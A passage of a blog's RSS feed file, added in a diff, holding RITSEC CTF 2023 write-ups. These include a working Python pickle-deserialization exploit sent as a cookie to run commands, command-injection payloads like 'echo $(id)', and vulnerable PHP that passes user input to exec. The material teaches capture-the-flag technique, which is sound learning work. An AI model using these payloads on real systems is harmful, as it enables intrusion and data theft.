+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;h2&amp;gt;&lt;/span&gt;b&lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;uid=1000(user) gid=1000(user) groups=1000(user)\n&lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'button'&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;New Order&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We now have our remote code execution, and we can find the flag.  As with x-men, the flag is located at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/flag&lt;/code&gt;.  All we have to do is change the second argument to the return in our reduce function.  Full code below:&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pickle&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SweetPickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__reduce__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;return &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;check_output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'cat'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/flag'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],))&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'https://pickles-web.challenges.ctf.ritsec.club/order'&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'order'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;SweetPickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
+&lt;p&gt;Encoding issues using the browser’s console to base64decode the cookie value sent me down a weird rabbit hole.  It was only showing me the text of the class name, but not the un-readable characters.  I SHOULD have known it was binary data, but I overlooked it and wasted about 20 minutes on that.  Lesson learned!!!!&lt;/p&gt;
+</description>
+        <pubDate>Sun, 02 Apr 2023 04:00:00 +0000</pubDate>
+        <link>/blog/ritsec-ctf-2023/web/pickle-store</link>
+        <guid isPermaLink="true">/blog/ritsec-ctf-2023/web/pickle-store</guid>
+      </item>
+    
+      <item>
+        <title>RITSEC 2023 - Misc / New Hire</title>
+        <description>&lt;h1 id=&quot;just-for-funsies&quot;&gt;Just For Funsies&lt;/h1&gt;
+&lt;p&gt;You are given a &lt;a href=&quot;&quot;&gt;LinkedIn&lt;/a&gt; profile, and told the following:&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;We’re thinking of hiring this new guy, what do you think of his skills?&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Well, we know that LinkedIn has a “Skills” section, let’s take a look!
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/img/posts/ritsec-ctf-2023/new-hire/skills.png&quot; alt=&quot;linkedin skills&quot; title=&quot;LinkedIn Skills&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+The first thing I noticed was that the first two skills started with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;R&lt;/code&gt; and then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;S&lt;/code&gt;.  Given that it’s a RITSEC CTF and the flag format is typically &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RS{&amp;lt;flag&amp;gt;}&lt;/code&gt;, it’s safe to assume the flag was a combination of the first letter of each skill, or all of the capitalized letters.&lt;/p&gt;
+
+&lt;h2 id=&quot;first-letter-of-each-skill&quot;&gt;First Letter of Each Skill&lt;/h2&gt;
+&lt;p&gt;This spelled &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RS{NOTEUR}&lt;/code&gt;.  Flags usually have a bit more context to them, so let’s try all capitalized letters.&lt;/p&gt;
+
+&lt;h2 id=&quot;capitalized-letters&quot;&gt;Capitalized Letters&lt;/h2&gt;
+&lt;p&gt;This one spelled out &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RS{NOOTSECURE}&lt;/code&gt;, which seemed like a more realistic flag.  I submitted the flag and that was it!&lt;/p&gt;
+
+&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
+&lt;p&gt;I like the idea of this challenge because it emphasizes the importance of OPsec and what you should and shouldn’t share online.  With that said, it just wasn’t my cup to tea so I decided to focus on the web challenges more.&lt;/p&gt;
+</description>
+        <pubDate>Sun, 02 Apr 2023 04:00:00 +0000</pubDate>
+        <link>/blog/ritsec-ctf-2023/misc/new-hire</link>
+        <guid isPermaLink="true">/blog/ritsec-ctf-2023/misc/new-hire</guid>
+      </item>
+    
+      <item>
+        <title>RITSEC 2023 - Crypto / Either or Neither nor</title>
+        <description>&lt;h1 id=&quot;the-prompt&quot;&gt;The Prompt&lt;/h1&gt;
+&lt;p&gt;You are given a page that links to a python snippet.  This snippet looks to encrypt a string using xor.&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#! /usr/bin/env python
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;XXXXXXXXXXXXXXXXXXXXX&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;enc_flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;91&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;241&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;101&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;166&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;85&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;192&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;87&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;188&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;110&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;164&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;99&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;152&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;98&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;252&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;34&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;152&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;117&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;164&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;99&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;162&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;107&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;KEY_LEN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Encrypt the flag
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;enumerate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;enc_flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;what-do-we-have&quot;&gt;What do we have?&lt;/h2&gt;
+&lt;p&gt;We know that xor encryption can be cracked easily in most cases.  Additionally, we know we have the encoded flag, and key length. We need to derive the flag.&lt;/p&gt;
+
+&lt;h2 id=&quot;brute-force-or-code&quot;&gt;Brute Force or Code?&lt;/h2&gt;
+&lt;p&gt;Realistically, I should have written my own script to do this.  However, I was lazy and went back to my good friend, &lt;a href=&quot;https://www.dcode.fr/xor-cipher&quot;&gt;decode.fr&lt;/a&gt;, specifically the XOR cipher tool.&lt;/p&gt;
+
+&lt;h2 id=&quot;decrypting&quot;&gt;Decrypting&lt;/h2&gt;
+&lt;p&gt;If you copy &lt;em&gt;just the values&lt;/em&gt; of the encoded flag (without the brackets) and paste it into the “Text to be XORed” field, it will audit detect the text type is &lt;strong&gt;Decimal Extended ASCII [0-255]&lt;/strong&gt;.  Perfect!&lt;br /&gt;
+Additionally, there’s a setting for “Knowing the key size (in bytes)”.  Well, we know that’s 4, so let’s put that in.&lt;/p&gt;
+
+&lt;h2 id=&quot;results&quot;&gt;Results&lt;/h2&gt;
+&lt;p&gt;Woah, that’s a lot of results.  That said, the first handful all have the open-brace character &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;{&lt;/code&gt;.  This tells me that the flag is already formatted for us.  The prompt also tells us that the flag is in the format &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MetaCTF{&amp;lt;flag&amp;gt;}&lt;/code&gt;.  Let’s search the page for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MetaCTF&lt;/code&gt;.  There’s only 1 hit, and it’s our flag!
+&lt;br /&gt;
+&lt;img src=&quot;/assets/img/posts/ritsec-ctf-2023/either-or-neither-nor/decrypted.png&quot; alt=&quot;Decrypted flag&quot; title=&quot;Decrypted Flag&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
+&lt;p&gt;This was another case of me being lazy instead of truly understanding how to reverse engineer these crypto algos. I got the flag, but I really should have spent the time to understand how it worked more.&lt;/p&gt;
+</description>
+        <pubDate>Sun, 02 Apr 2023 04:00:00 +0000</pubDate>
+        <link>/blog/ritsec-ctf-2023/crypto/either-or-neither-nor</link>
+        <guid isPermaLink="true">/blog/ritsec-ctf-2023/crypto/either-or-neither-nor</guid>
+      </item>
+    
+      <item>
+        <title>RITSEC 2023 - Web / Echoes</title>
+        <description>&lt;h1 id=&quot;the-challenge&quot;&gt;The Challenge&lt;/h1&gt;
+&lt;p&gt;You are led to a website called the “RITSEC Echo Simulator”, where it encourages you to test out some words in an input box.  There’s a single button to test the word.&lt;/p&gt;
+
+&lt;h2 id=&quot;fuzzing&quot;&gt;Fuzzing&lt;/h2&gt;
+&lt;p&gt;I first entered some gibberish just to see how the application behaved, and a new page loaded with the following:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;You entered: asdf
+
+This word echoes (echoes) (echoes)...see?
+asdf
+asdf
+asdf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Because it’s showing the data, this led me to think it’s either an XSS or command injection.  There were no obvious signs that a bot or someone else is monitoring the site, so I leaned into command injection.&lt;/p&gt;
+
+&lt;h2 id=&quot;echo&quot;&gt;Echo…?&lt;/h2&gt;
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo&lt;/code&gt; is a command commonly used in linux.  For example: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo something&lt;/code&gt; will print &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;something&lt;/code&gt; as the ouput. You can use subshells (as is common in a lot of command injection vectors) to echo the result of another command.  As an example, you could run: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo &quot;My Username is $(whoami)&quot;&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ritsec-ctf-2023/echo/echo-username.png&quot; alt=&quot;echo &amp;quot;My Username is $(whoami)&amp;quot;&quot; title=&quot;echo &amp;quot;My Username is $(whoami)&amp;quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;subshell&quot;&gt;Subshell&lt;/h2&gt;
+&lt;p&gt;I tried adding just &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whoami&lt;/code&gt; to see if it was a direct injection, but that didn’t work out.  It was just displaying the text.  I moved on to using a subshell, as shown above with the username example.  Let’s try &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$(id)&lt;/code&gt; as an input:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ritsec-ctf-2023/echo/echo-username.png&quot; alt=&quot;This word does not echo&quot; title=&quot;This word does not echo&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+hmmmmmmm, ok. There may be some filtering, or I’m not understanding exactly how this is called.  This is a different response though, so it’s progress nonetheless!&lt;/p&gt;
+
+&lt;h2 id=&quot;echo-subshell&quot;&gt;Echo Subshell&lt;/h2&gt;
+&lt;p&gt;I mean, the name of the challenge is “Echoes”, so let’s try to do the full echo command: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo $(id)&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ritsec-ctf-2023/echo/rce.png&quot; alt=&quot;remote code execution displaying the user id of the process&quot; title=&quot;We got RCE!&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+Boom!  We got a remote code execution.  Now we just need to find that pesky flag. Doing a directory listing, we leak the flag location (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag.txt&lt;/code&gt;) by entering &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo $(ls -la)&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h1 id=&quot;what-was-in-the-php-code&quot;&gt;What was in the PHP Code?&lt;/h1&gt;
+&lt;p&gt;Fortunately, we can read out arbitrary files using our RCE, and doing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -la&lt;/code&gt;, we can see there’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check.php&lt;/code&gt; in the current directory.  Let’s take a look at that and figure out why our exploit worked this way.  …but wait, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo $(cat check.php)&lt;/code&gt; says that this word doesn’t echo.  Is there something in place to prevent this?  This is where I stopped looking because I had the flag.  Future Leo, however, went back and checked the &lt;a href=&quot;https://gitlab.ritsec.cloud/competitions/ctf-2023-public/-/blob/master/Web/echoes/web/check.php&quot;&gt;source code&lt;/a&gt; because I was missing something here.  Let’s take a look at the relevant code:&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;nt&quot;&gt;&amp;lt;p&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;php&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;This word
+      &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;word&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+          &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nl2br&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;echoes (echoes) (echoes)...see?&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	  &lt;span class=&quot;nv&quot;&gt;$cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;echo &quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;word&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+	  &lt;span class=&quot;nv&quot;&gt;$outout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+          &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$outout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+          &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;word&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+	  &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;br /&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	  &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;word&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; 
+	  &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;br /&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+          &lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$outout&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;br /&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+		  
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;does not echo... weird&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+       &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;So uhhhhh, it was an even/odd number of character thing?  This is WAY more simple than I had initially thought, and I over-complicated things a good bit.  My above assumptions only worked due to sheer dumb luck regarding the number of characters when running my attempted exploits.&lt;/p&gt;
+
+&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
+&lt;p&gt;I liked this challenge because of the “easy” remote code execution, however, I was really surprised to see how simple the logic actually was.  I was assuming there was some filtering in place to prevent code exfiltration or something similar, but that wasn’t the case!  This really brings to light the benefit of having source code available for gray-box testing.  If this were for a pen-test, I would have written up steps to reproduce that were both inaccurate and overly complicated.&lt;/p&gt;
+</description>
+        <pubDate>Sun, 02 Apr 2023 04:00:00 +0000</pubDate>
+        <link>/blog/ritsec-ctf-2023/web/echoes</link>
+        <guid isPermaLink="true">/blog/ritsec-ctf-2023/web/echoes</guid>
+      </item>
+    
+      <item>
+        <title>RITSEC 2023 - Misc / Connection Terminated</title>
+        <description>&lt;h1 id=&quot;full-disclosure&quot;&gt;Full Disclosure&lt;/h1&gt;
